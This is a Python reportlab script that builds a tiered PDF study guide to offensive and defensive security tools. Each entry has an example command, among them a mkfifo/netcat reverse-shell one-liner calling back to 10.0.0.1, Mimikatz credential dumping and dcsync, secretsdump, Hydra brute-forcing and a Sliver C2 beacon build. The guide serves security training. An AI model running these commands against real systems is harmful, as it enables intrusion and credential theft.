import os
import sys
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.units import inch
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, KeepTogether, HRFlowable
)
from reportlab.pdfgen import canvas

class NumberedCanvas(canvas.Canvas):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        num_pages = len(self._saved_page_states)
        for state in self._saved_page_states:
            self.__dict__.update(state)
            self.draw_page_decorations(num_pages)
            super().showPage()
        super().save()

    def draw_page_decorations(self, page_count):
        self.saveState()
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor("#64748B"))
        
        # Header (pages > 1)
        if self._pageNumber > 1:
            self.drawString(54, 755, "CYBERSECURITY TOOLS ROADMAP: BEGINNER TO ELITE")
            self.drawRightString(612 - 54, 755, "OFFENSIVE & DEFENSIVE MASTERY")
            self.setStrokeColor(colors.HexColor("#CBD5E1"))
            self.setLineWidth(0.5)
            self.line(54, 747, 612 - 54, 747)
        
        # Footer
        page_text = f"Page {self._pageNumber} of {page_count}"
        self.drawRightString(612 - 54, 35, page_text)
        self.drawString(54, 35, "Confidential Study Reference • Antigravity Security Curriculum")
        self.setStrokeColor(colors.HexColor("#CBD5E1"))
        self.setLineWidth(0.5)
        self.line(54, 47, 612 - 54, 47)
        self.restoreState()

def create_tools_pdf(filename):
    doc = SimpleDocTemplate(
        filename,
        pagesize=letter,
        leftMargin=54,
        rightMargin=54,
        topMargin=54,
        bottomMargin=54
    )

    styles = getSampleStyleSheet()
    
    # Custom styles
    title_style = ParagraphStyle(
        'DocTitle',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=24,
        leading=28,
        textColor=colors.HexColor("#0F172A"),
        spaceAfter=8,
        alignment=1
    )
    
    subtitle_style = ParagraphStyle(
        'DocSubTitle',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=12,
        leading=16,
        textColor=colors.HexColor("#0284C7"),
        spaceAfter=15,
        alignment=1
    )
    
    h1_style = ParagraphStyle(
        'TierHeading',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=14,
        leading=18,
        textColor=colors.white,
        spaceAfter=0
    )
    
    h2_style = ParagraphStyle(
        'ToolName',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=11,
        leading=14,
        textColor=colors.HexColor("#0F172A")
    )

    tag_style = ParagraphStyle(
        'ToolTag',
        parent=styles['Normal'],
        fontName='Helvetica-Bold',
        fontSize=8,
        leading=10,
        textColor=colors.HexColor("#0369A1")
    )
    
    body_style = ParagraphStyle(
        'ToolBody',
        parent=styles['Normal'],
        fontName='Helvetica',
        fontSize=9,
        leading=12,
        textColor=colors.HexColor("#334155")
    )

    code_style = ParagraphStyle(
        'ToolCode',
        parent=styles['Normal'],
        fontName='Courier',
        fontSize=8,
        leading=10,
        textColor=colors.HexColor("#0F172A")
    )

    meta_style = ParagraphStyle(
        'MetaText',
        parent=styles['Normal'],
        fontName='Helvetica-Oblique',
        fontSize=8,
        leading=11,
        textColor=colors.HexColor("#64748B")
    )

    story = []

    # Title Block
    story.append(Paragraph("THE DEFINITIVE CYBERSECURITY TOOLS ROADMAP", title_style))
    story.append(Paragraph("From Absolute Fundamentals to Elite Kernel & Reverse Engineering", subtitle_style))
    story.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#0284C7"), spaceAfter=15))

    intro_p = Paragraph(
        "<b>Architect's Briefing:</b> The cybersecurity toolscape is vast and intimidating. "
        "A common pitfall is jumping straight into advanced exploitation or reverse engineering suites without "
        "commanding foundational networking and protocol utilities. This guide arranges the industry's essential "
        "security tools into <b>5 progressive difficulty tiers</b> (Entry to God-Tier). "
        "Master each tier completely before advancing.",
        body_style
    )
    story.append(intro_p)
    story.append(Spacer(1, 12))

    tiers_data = [
        {
            "name": "TIER 1: THE FOUNDATIONAL UTILITIES",
            "subtitle": "Difficulty: Level 1 (Easy / Day 1 Essentials) • Prerequisite: Basic CLI & TCP/IP",
            "color": colors.HexColor("#0284C7"),
            "tools": [
                {
                    "name": "Nmap (Network Mapper)",
                    "type": "Network Discovery & Port Scanning",
                    "what": "The undisputed king of network reconnaissance. Scans hosts, discovers open TCP/UDP ports, fingerprints operating systems, and identifies service banners and CVEs using the Nmap Scripting Engine (NSE).",
                    "cmd": "nmap -sC -sV -p- -T4 10.10.10.x -oN initial_scan.txt",
                    "why": "Every single security engagement starts here. Without network visibility, you are blind."
                },
                {
                    "name": "Wireshark & Tshark",
                    "type": "Deep Packet Inspection & Network Sniffing",
                    "what": "Captures raw frames from network interfaces and decodes hundreds of protocols in real-time. Allows inspection of unencrypted passwords, handshake flows, malware callbacks, and TLS negotiation.",
                    "cmd": "wireshark -k -i eth0  |  tshark -r capture.pcap -Y 'http.request.method == POST'",
                    "why": "Bridges theoretical networking with physical binary stream realities. Essential for both Red and Blue."
                },
                {
                    "name": "Netcat (nc) & Socat",
                    "type": "Arbitrary TCP/UDP Data Relays (The Swiss Army Knife)",
                    "what": "Reads and writes data across network connections. Spawns bind/reverse shells, transfers files, tests port connectivity, and redirects traffic between hosts.",
                    "cmd": "Attacker: nc -lvnp 4444  |  Target: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
                    "why": "The universal standard for catching reverse shells and transferring raw data across airgaps."
                },
                {
                    "name": "Gobuster & ffuf",
                    "type": "High-Speed Web Asset & Directory Fuzzing",
                    "what": "High-concurrency Go tools that brute-force hidden directories, files, DNS subdomains, and virtual hosts against web servers using dictionary lists (e.g. SecLists).",
                    "cmd": "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ",
                    "why": "Modern web applications hide 80% of endpoints. Fast fuzzing reveals forgotten admin portals and backups."
                },
                {
                    "name": "Whois, Dig & Nslookup",
                    "type": "Passive Domain & DNS Reconnaissance",
                    "what": "Queries domain registrars and DNS nameservers for zone transfers (AXFR), MX records, TXT SPF records, and historical nameserver infrastructure.",
                    "cmd": "dig any target.com @ns1.target.com  +nocmd +noall +answer",
                    "why": "Zero-noise passive reconnaissance that uncovers internal subdomains without sending traffic to the target app."
                }
            ]
        },
        {
            "name": "TIER 2: CORE EXPLOITATION & AUDITING",
            "subtitle": "Difficulty: Level 2 (Intermediate) • Prerequisite: HTTP RFC, OWASP Top 10, Kali Linux",
            "color": colors.HexColor("#0D9488"),
            "tools": [
                {
                    "name": "Burp Suite (Community / Professional)",
                    "type": "Web Application Interception Proxy",
                    "what": "Intercepts, modifies, and repeats HTTP/WebSocket traffic between browser and server. Includes Repeater, Intruder, Decoder, and vulnerability scanning extensions via BApp Store.",
                    "cmd": "Configure browser proxy: 127.0.0.1:8080 -> Capture request -> Send to Repeater (Ctrl+R)",
                    "why": "The industry standard for all Web Penetration Testing and Bug Bounty hunting. Nothing replaces Burp."
                },
                {
                    "name": "Metasploit Framework (MSF)",
                    "type": "Modular Penetration Testing & Exploitation Engine",
                    "what": "Provides thousands of verified public exploits, payloads, encoders, and post-exploitation modules. Drops Meterpreter agents for full in-memory system control.",
                    "cmd": "msfconsole -q -> use exploit/multi/handler -> set payload windows/x64/meterpreter/reverse_tcp -> run",
                    "why": "Accelerates weaponization and post-exploitation. Teaches payload architecture and staged delivery."
                },
                {
                    "name": "SQLmap",
                    "type": "Automatic SQL Injection & Database Takeover",
                    "what": "Detects and exploits Boolean-based, Error-based, Blind, Time-based, and UNION SQL injection flaws. Dumps databases, cracks hashes, and pops OS shells via xp_cmdshell / UDF.",
                    "cmd": "sqlmap -r request.txt --batch --dbs --current-user --risk=2 --level=3",
                    "why": "Turns tedious database exfiltration into automated operations. A must-know for web auditors."
                },
                {
                    "name": "Hashcat & John the Ripper",
                    "type": "Advanced GPU/CPU Password Cracking",
                    "what": "Fastest password hash cracking utilities in existence. Leverages GPU OpenCL/CUDA pipelines against NTLM, MD5, SHA256, Kerberos tickets, and encrypted archives using wordlists and rules.",
                    "cmd": "hashcat -m 1000 -a 0 hashes.ntlm /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
                    "why": "Essential when dumps or SAM/NTDS databases are retrieved during internal infrastructure assessments."
                },
                {
                    "name": "Hydra",
                    "type": "Online Network Login Brute-Forcer",
                    "what": "Parallelized authentication brute-forcing tool supporting over 50 protocols including SSH, FTP, Telnet, SMB, RDP, HTTP-POST, and MySQL.",
                    "cmd": "hydra -L users.txt -P passwords.txt -t 4 ssh://10.10.10.x -V",
                    "why": "Automates brute-force login testing on default or leaked administrative credentials across network services."
                }
            ]
        },
        {
            "name": "TIER 3: ENTERPRISE INFRASTRUCTURE & AD DOMAIN COMPROMISE",
            "subtitle": "Difficulty: Level 3 (Upper-Intermediate to Advanced) • Prerequisite: Windows Internals & Kerberos",
            "color": colors.HexColor("#D97706"),
            "tools": [
                {
                    "name": "BloodHound & SharpHound",
                    "type": "Active Directory Graph Theory Attack Mapper",
                    "what": "Collects Active Directory object relationships (users, groups, ACLs, sessions) and ingests them into Neo4j graph databases to map shortest paths to Domain Admin (DA).",
                    "cmd": "SharpHound.exe --CollectionMethods All  ->  Upload zip to BloodHound GUI -> Find Shortest Paths to DA",
                    "why": "Turns enterprise privilege escalation from guesswork into mathematical pathfinding. Indispensable in corporate networks."
                },
                {
                    "name": "Mimikatz",
                    "type": "Windows In-Memory Credential Extraction Suite",
                    "what": "Extracts plaintext passwords, NTLM hashes, PIN codes, and Kerberos tickets directly from LSASS memory. Forges Golden/Silver Kerberos tickets and performs Pass-The-Hash.",
                    "cmd": "privilege::debug -> sekurlsa::logonpasswords -> lsadump::dcsync /domain:lab.local /user:krbtgt",
                    "why": "The classic tool that changed Windows security forever. Understanding Mimikatz is required to understand LSASS protection."
                },
                {
                    "name": "Impacket Suite",
                    "type": "Python Collection of Low-Level Network Protocols",
                    "what": "Provides offensive Python implementations of SMB, MSRPC, Kerberos, and LDAP. Includes psexec.py, wmiexec.py, secretsdump.py, and GetUserSPNs.py (Kerberoasting).",
                    "cmd": "secretsdump.py DOMAIN/admin:password@10.10.10.x -just-dc-ntlm",
                    "why": "Allows pure protocol-level interaction without needing Windows agents or heavy software frameworks."
                },
                {
                    "name": "Chisel & Ligolo-ng",
                    "type": "TCP/UDP Tunneling, Reverse SOCKS & Internal Pivoting",
                    "what": "Multiplexes encrypted tunnels over HTTP/WebSocket or TUN interfaces. Allows operators on Kali to route entire toolchains directly into segmented enterprise networks.",
                    "cmd": "ligolo-proxy -self-cert  |  agent.exe -connect 10.10.10.x:11601 -ignore-cert -> start tun interface",
                    "why": "Pivoting is the differentiator between CTF players and real enterprise red team operators."
                },
                {
                    "name": "Cobalt Strike, Sliver & Mythic",
                    "type": "Adversary Simulation & C2 (Command and Control) Frameworks",
                    "what": "Full-featured Red Team platforms orchestrating multiple in-memory implants (Beacons) over malleable HTTP/DNS/SMB channels with sleep obfuscation and lateral movement.",
                    "cmd": "sliver-server  ->  generate beacon --http c2.example.com --os windows --arch amd64",
                    "why": "Simulates real-world Advanced Persistent Threats (APTs) against enterprise SOC teams."
                }
            ]
        },
        {
            "name": "TIER 4: REVERSE ENGINEERING & BINARY EXPLOITATION",
            "subtitle": "Difficulty: Level 4 (Hard / Specialist Track) • Prerequisite: x86/x64 Assembly, C, Memory Layout",
            "color": colors.HexColor("#DC2626"),
            "tools": [
                {
                    "name": "Ghidra (NSA Software Reverse Engineering Framework)",
                    "type": "Multi-Architecture Disassembler & Decompiler Suite",
                    "what": "Decompiles raw machine code into readable C pseudo-code across x86, ARM, MIPS, and PPC. Features collaborative reversing, automated type propagation, and headless scripting.",
                    "cmd": "ghidraRun -> Import ELF/PE -> Auto-Analyze -> Navigate to main() -> Press F5 to decompile",
                    "why": "Free, open-source, enterprise-grade decompiler. The standard for malware analysts and firmware researchers."
                },
                {
                    "name": "IDA Pro & Binary Ninja",
                    "type": "Commercial Industry-Standard Binary Disassemblers",
                    "what": "The pinnacle of static binary analysis with deep type engines, intermediate representations (BNIL), and unmatched disassembly precision for complex obfuscated targets.",
                    "cmd": "Load binary -> Graph View (Spacebar) -> Rename variables (N) -> Cross-references (X)",
                    "why": "Used by top-tier vulnerability researchers, zero-day hunters, and enterprise malware response units."
                },
                {
                    "name": "GDB + GEF / pwndbg",
                    "type": "Linux Dynamic Debugger & Exploit Engineering Environment",
                    "what": "Enhances GNU Debugger with exploit dev interfaces: live stack inspection, registers, canary checks, ROP gadget lookup, and heap analysis (chunk visualization).",
                    "cmd": "gdb ./vuln_binary -> checksec -> pattern create 100 -> run -> pattern search $rsp",
                    "why": "Essential for binary exploitation, CTF pwn challenges, format string bugs, and Linux heap corruption."
                },
                {
                    "name": "x64dbg & OllyDbg",
                    "type": "Windows User-Mode Dynamic Debugger",
                    "what": "Interactive Windows debugger for stepping through running PE executables, setting software/hardware breakpoints, unpacking packers (UPX), and modifying instructions live.",
                    "cmd": "Attach to process -> Set breakpoint on VirtualAlloc / WriteProcessMemory -> Step over (F8)",
                    "why": "The premier tool for analyzing Windows malware behavior, keygenning, and unpacking obfuscated droppers."
                },
                {
                    "name": "ROPgadget & one_gadget",
                    "type": "Return-Oriented Programming (ROP) Chain Synthesizers",
                    "what": "Searches binaries and shared libraries (libc) for assembly gadgets ending in RET to bypass non-executable stack protections (DEP/NX) and forge execve('/bin/sh') calls.",
                    "cmd": "ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'pop|ret' | one_gadget libc.so.6",
                    "why": "Required when classic stack execution is blocked by hardware NX/DEP and ASLR mitigation."
                }
            ]
        },
        {
            "name": "TIER 5: ELITE SPECIALIZATION (KERNEL, MEMORY & HARDWARE)",
            "subtitle": "Difficulty: Level 5 (God-Tier / Expert) • Prerequisite: Ring 0, OS Kernels, Hardware Bus Architecture",
            "color": colors.HexColor("#7C3AED"),
            "tools": [
                {
                    "name": "WinDbg (Windows Debugger Preview)",
                    "type": "Windows Kernel-Mode & Live Memory Debugger",
                    "what": "Attaches to the Windows NT Kernel over KDNET or COM. Examines kernel structures (EPROCESS, KTHREAD), analyzes blue-screen dumps (BSOD), and exploits Ring 0 vulnerabilities.",
                    "cmd": "kd> !process 0 0 system  |  kd> dt nt!_EPROCESS <address>  |  kd> ba e 1 nt!NtOpenProcess",
                    "why": "The primary debugger for kernel rootkit analysis, EDR driver internals, and privilege escalation via drivers."
                },
                {
                    "name": "Frida",
                    "type": "Dynamic Binary Instrumentation (DBI) Toolkit",
                    "what": "Injects JavaScript runtimes into native running processes on Windows, macOS, Linux, iOS, and Android. Hooks arbitrary functions, modifies return values, and bypasses SSL pinning live.",
                    "cmd": "frida -U -f com.target.app -l bypass_ssl_pinning.js --no-pause",
                    "why": "The gold standard for mobile application testing, DRM defeat, and dynamic security analysis."
                },
                {
                    "name": "Volatility 3",
                    "type": "Advanced Volatile Memory Forensics Framework",
                    "what": "Analyzes raw RAM dumps from compromised servers or endpoints. Reconstructs process trees, detects injected DLLs, extracts cached passwords, and exposes rootkits.",
                    "cmd": "vol -f memdump.raw windows.pslist  |  vol -f memdump.raw windows.malfind",
                    "why": "Advanced malware lives only in RAM without touching disk. Volatility provides the ultimate forensic truth."
                },
                {
                    "name": "Sysinternals Suite (Procmon, Procexp, Autoruns)",
                    "type": "Deep Windows System Internals Monitoring",
                    "what": "Authored by Mark Russinovich. Process Monitor captures file, registry, and thread activity in microsecond resolution. Autoruns exposes persistence mechanisms.",
                    "cmd": "Procmon.exe -> Filter: Process Name is target.exe -> Capture File/Registry Events",
                    "why": "The fundamental diagnostic and malware analysis suite for Windows endpoint behavior."
                },
                {
                    "name": "Hardware Debuggers: JTAG, UART & Logic Analyzers",
                    "type": "Physical Hardware & Embedded Firmware Extraction",
                    "what": "Connects to physical PCB test pads using FTDI serial converters, Saleae logic sniffers, and JTAG adapters to intercept bus traffic (SPI, I2C), dump flash ROMs, and pop root shells.",
                    "cmd": "screen /dev/ttyUSB0 115200  |  flashrom -p ch341a_spi -r firmware.bin",
                    "why": "The physical realm where software boundaries end. Mandatory for IoT security and automotive testing."
                }
            ]
        }
    ]

    for tier in tiers_data:
        # Tier Header Box
        header_table = Table(
            [[Paragraph(f"<b>{tier['name']}</b><br/><font size=8>{tier['subtitle']}</font>", h1_style)]],
            colWidths=[504]
        )
        header_table.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,-1), tier['color']),
            ('TOPPADDING', (0,0), (-1,-1), 6),
            ('BOTTOMPADDING', (0,0), (-1,-1), 6),
            ('LEFTPADDING', (0,0), (-1,-1), 10),
            ('RIGHTPADDING', (0,0), (-1,-1), 10),
            ('CORNERPAD', (0,0), (-1,-1), 0),
        ]))
        story.append(header_table)
        story.append(Spacer(1, 8))

        # Tool cards
        for tool in tier['tools']:
            tool_content = [
                [Paragraph(f"<b>{tool['name']}</b> — <font color='#0284C7'>{tool['type']}</font>", h2_style)],
                [Paragraph(f"<b>Capabilities:</b> {tool['what']}", body_style)],
                [Paragraph(f"<b>Standard Syntax / Workflow:</b>", tag_style)],
                [Paragraph(f"<code>{tool['cmd']}</code>", code_style)],
                [Paragraph(f"<b>Why It Matters:</b> {tool['why']}", meta_style)],
            ]
            tool_table = Table(tool_content, colWidths=[504])
            tool_table.setStyle(TableStyle([
                ('BACKGROUND', (0,0), (-1,-1), colors.HexColor("#F8FAFC")),
                ('BOX', (0,0), (-1,-1), 0.75, colors.HexColor("#E2E8F0")),
                ('LINEBELOW', (0,0), (0,0), 0.5, colors.HexColor("#CBD5E1")),
                ('TOPPADDING', (0,0), (-1,-1), 4),
                ('BOTTOMPADDING', (0,0), (-1,-1), 4),
                ('LEFTPADDING', (0,0), (-1,-1), 8),
                ('RIGHTPADDING', (0,0), (-1,-1), 8),
            ]))
            story.append(tool_table)
            story.append(Spacer(1, 6))

        story.append(Spacer(1, 10))

    # Final Summary Matrix Page
    story.append(PageBreak())
    story.append(Paragraph("MASTER TOOLS QUICK-REFERENCE MATRIX", title_style))
    story.append(Paragraph("Summary Matrix: Difficulty, Domain & Mastery Order", subtitle_style))
    story.append(HRFlowable(width="100%", thickness=1, color=colors.HexColor("#0284C7"), spaceAfter=12))

    matrix_headers = [
        Paragraph("<b>Tier / Level</b>", tag_style),
        Paragraph("<b>Primary Tools</b>", tag_style),
        Paragraph("<b>Discipline</b>", tag_style),
        Paragraph("<b>Learning Threshold</b>", tag_style)
    ]
    matrix_rows = [
        matrix_headers,
        [
            Paragraph("<b>Tier 1 (Easy)</b>", body_style),
            Paragraph("Nmap, Wireshark, Netcat, ffuf, Dig", body_style),
            Paragraph("Recon & Protocols", body_style),
            Paragraph("1–3 Weeks", body_style)
        ],
        [
            Paragraph("<b>Tier 2 (Medium)</b>", body_style),
            Paragraph("Burp Suite, Metasploit, SQLmap, Hashcat, Hydra", body_style),
            Paragraph("Web & Vuln Auditing", body_style),
            Paragraph("1–2 Months", body_style)
        ],
        [
            Paragraph("<b>Tier 3 (Advanced)</b>", body_style),
            Paragraph("BloodHound, Mimikatz, Impacket, Ligolo, Sliver", body_style),
            Paragraph("Active Directory & C2", body_style),
            Paragraph("3–6 Months", body_style)
        ],
        [
            Paragraph("<b>Tier 4 (Hard)</b>", body_style),
            Paragraph("Ghidra, IDA, GDB+GEF, x64dbg, ROPgadget", body_style),
            Paragraph("Reverse Eng & Pwn", body_style),
            Paragraph("6–12 Months", body_style)
        ],
        [
            Paragraph("<b>Tier 5 (Elite)</b>", body_style),
            Paragraph("WinDbg, Frida, Volatility, Sysinternals, JTAG", body_style),
            Paragraph("Kernel, Mobile & Hardware", body_style),
            Paragraph("1+ Years Dedicated", body_style)
        ]
    ]
    matrix_table = Table(matrix_rows, colWidths=[90, 180, 130, 104])
    matrix_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#E2E8F0")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#94A3B8")),
        ('TOPPADDING', (0,0), (-1,-1), 6),
        ('BOTTOMPADDING', (0,0), (-1,-1), 6),
        ('LEFTPADDING', (0,0), (-1,-1), 6),
        ('RIGHTPADDING', (0,0), (-1,-1), 6),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [colors.white, colors.HexColor("#F8FAFC")]),
    ]))
    story.append(matrix_table)
    story.append(Spacer(1, 15))

    conclusion = Paragraph(
        "<b>Next Steps:</b> Refer back to your books in <code>01-foundations/</code>, "
        "<code>02-core-security/</code>, and <code>03-intermediate-labs/</code> to practice hands-on labs with each of these "
        "tools. Track your learning progression using the checkboxes in the root <code>README.md</code>.",
        body_style
    )
    story.append(conclusion)

    doc.build(story, canvasmaker=NumberedCanvas)
    print(f"Generated PDF: {filename}")

if __name__ == "__main__":
    out_dir = "/home/abrham/Documents/Books/05-cheatsheets-and-reference/tools"
    os.makedirs(out_dir, exist_ok=True)
    target = os.path.join(out_dir, "The_Cybersecurity_Tools_Roadmap_Beginner_to_Advanced.pdf")
    create_tools_pdf(target)
